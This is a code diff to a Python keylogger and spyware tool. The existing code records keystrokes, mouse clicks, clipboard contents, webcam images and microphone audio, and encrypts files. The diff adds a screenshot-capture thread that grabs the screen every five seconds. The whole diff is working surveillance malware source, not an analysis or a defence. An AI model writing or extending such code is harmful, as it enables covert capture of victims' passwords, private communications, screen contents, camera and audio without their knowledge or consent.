@@ -1,4 +1,5 @@
-# -*- coding: utf-8 -*-
+######################### IMPORT STATEMENTS #########################
+
 import logging
 import requests
 import threading
@@ -18,7 +19,11 @@ import pathlib
 from pynput import keyboard, mouse
 from pynput.keyboard import Key
 from cryptography.fernet import Fernet
+from PIL import ImageGrab
 
+
+
+# Constants
 WEBCAM= 'WebcamPics'
 LOG_FILE = "keylogfile.txt"
 CLIPBOARD = "clipboard.txt"
@@ -27,6 +32,7 @@ CHUNK = 4096
 FORMAT = pyaudio.paInt32
 CHANNELS = 2
 RATE = 48000
+
 
 #Initialize PyAudio
 audio = pyaudio.PyAudio()
@@ -69,6 +75,7 @@ def log_system_info():
 # Handler for key press event
 def on_press(key):
     logging.info(f"[Key Pressed] - {key}")
+
 
 # Handler for mouse click event
 def on_click(button, pressed):
@@ -131,6 +138,7 @@ def webcam():
     except Exception as e:
         print("WebcamPics could not be saved: " + str(e))
 
+
 # Monitor clipboard
 def clipboard():
     previous_clipboard_data = ""  # Store the previous clipboard content
@@ -151,9 +159,28 @@ def clipboard():
 
             # Add a small delay to avoid high CPU usage
             time.sleep(1)
+
     except Exception as e:
         with open(CLIPBOARD, "a") as file:
             file.write("\n Clipboard could not be copied: " + str(e) + "\n")
+
+
+# Screenshot
+def screenshot():
+    try:
+        while not stop_thread.is_set():
+            pathlib.Path('Screenshots').mkdir(parents=True, exist_ok=True)
+            screen_path = 'Screenshots\\'
+
+            for x in range(0,10):
+                pic = ImageGrab.grab()
+                pic.save(screen_path + 'screenshot{}.png'.format(x))
+                time.sleep(5)
+                if stop_thread.is_set():
+                    break  # Break the loop if the stop flag is set
+
+    except Exception as e:
+        print("Screenshots could not be saved: " + str(e))
 
 
 # Encrypt files
@@ -184,10 +211,12 @@ def main():
         t1 = threading.Thread(target=clipboard)
         t2 = threading.Thread(target=webcam)
         t3 = threading.Thread(target=Audio)
+        t4 = threading.Thread(target=screenshot)
 
         t1.start()
         t2.start()
         t3.start()
+        t4.start()
 
         # Start the keyboard and mouse listeners
         with keyboard.Listener(on_press=on_press, on_release=on_release) as key_listener, \
@@ -213,6 +242,7 @@ def main():
         t1.join()
         t2.join()
         t3.join()
+        t4.join()
 
 if __name__ == '__main__':
     try:
